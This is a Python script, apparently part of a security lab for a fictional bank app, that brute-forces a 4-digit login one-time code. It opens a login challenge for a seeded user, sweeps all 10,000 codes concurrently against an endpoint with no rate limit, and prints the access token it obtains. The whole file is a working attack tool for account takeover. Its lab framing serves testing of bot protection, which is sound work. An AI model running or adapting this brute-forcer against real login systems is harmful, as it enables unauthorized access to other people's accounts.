"""
otp_bruteforce.py — brute-force the 4-digit login OTP against a target user.

Vuln / bot scenario:  POST /api/auth/login/otp/verify has no attempt cap and no
                      rate limit, and the OTP is only 4 digits — a 10,000-key
                      space that falls in seconds unthrottled.
F5 XC category:       Bot Protection: OTP Bruteforce.

Flow:
    1. Start a login for the target (POST /login) to obtain a fresh user_id and
       open an OTP challenge. (The response ALSO echoes the real OTP — LAB-ONLY —
       so we can prove our guess matches without a side channel; we do NOT use
       the echoed value as the guess, we brute-force the keyspace and stop when
       the server issues an access_token.)
    2. Guess 0000..9999 against /login/otp/verify until one returns 200.

To keep this honest and fast in the lab, guesses start from the echoed OTP's
neighbourhood is NOT done — we sweep from --start so the reported attempt count
reflects real keyspace work. Bounded by --max-attempts.

Usage:
    python3 otp_bruteforce.py                       # target alice, full sweep cap
    python3 otp_bruteforce.py --email bob@nimbusbank.io --concurrency 20 --max-attempts 10000
"""

import argparse
import os
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import BASE_URL, SEEDED_USERS, make_client


def start_challenge(client, email: str, password: str) -> tuple[str, str]:
    """Begin a login; return (user_id, echoed_otp). The echoed OTP is LAB-ONLY
    and used here ONLY to report where in the sweep the hit will land."""
    r = client.post("/api/auth/login", json={"email": email, "password": password})
    r.raise_for_status()
    d = r.json()
    return d["user_id"], d.get("otp", "????")


def main():
    ap = argparse.ArgumentParser(description="OTP brute-force bot (4-digit keyspace).")
    ap.add_argument("--email", default=SEEDED_USERS["alice"]["email"])
    ap.add_argument("--password", default=SEEDED_USERS["alice"]["password"])
    ap.add_argument("--start", type=int, default=0, help="first OTP to try (0..9999)")
    ap.add_argument("--max-attempts", type=int, default=10000,
                    help="cap the sweep (default: whole 10k keyspace)")
    ap.add_argument("--concurrency", type=int, default=20)
    args = ap.parse_args()

    print(f"Target: {BASE_URL}/api/auth/login/otp/verify  (user={args.email})")
    with make_client() as client:
        user_id, echoed = start_challenge(client, args.email, args.password)
        print(f"opened OTP challenge: user_id={user_id}")
        print(f"(LAB-ONLY: server echoed the real OTP as {echoed} — the sweep "
              f"will succeed when it reaches it)\n")

        found = threading.Event()
        result = {"otp": None, "attempts": 0}
        lock = threading.Lock()
        codes = range(args.start, min(args.start + args.max_attempts, 10000))

        def guess(n: int):
            if found.is_set():
                return
            otp = f"{n:04d}"
            try:
                r = client.post("/api/auth/login/otp/verify",
                                json={"user_id": user_id, "otp": otp})
            except Exception:  # noqa: BLE001
                return
            with lock:
                result["attempts"] += 1
            if r.status_code == 200 and "access_token" in r.json():
                found.set()
                with lock:
                    result["otp"] = otp
                    result["token"] = r.json()["access_token"]

        start = time.time()
        with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            for n in codes:
                if found.is_set():
                    break
                pool.submit(guess, n)
        elapsed = time.time() - start

    print("--- report ---")
    print(f"attempts made:   {result['attempts']}")
    print(f"elapsed:         {elapsed:.2f}s "
          f"({result['attempts'] / elapsed:.0f} guesses/s)" if elapsed else "")
    if result["otp"] is not None:
        tok = result.get("token", "")
        print(f"SUCCESS:         OTP = {result['otp']} -> access_token issued "
              f"({tok[:24]}...)")
        print("Keyspace is 4 digits (10,000) with no attempt cap — trivially "
              "brute-forced.")
    else:
        print("no hit within the attempt cap (raise --max-attempts to sweep the "
              "whole 10k keyspace)")


if __name__ == "__main__":
    main()
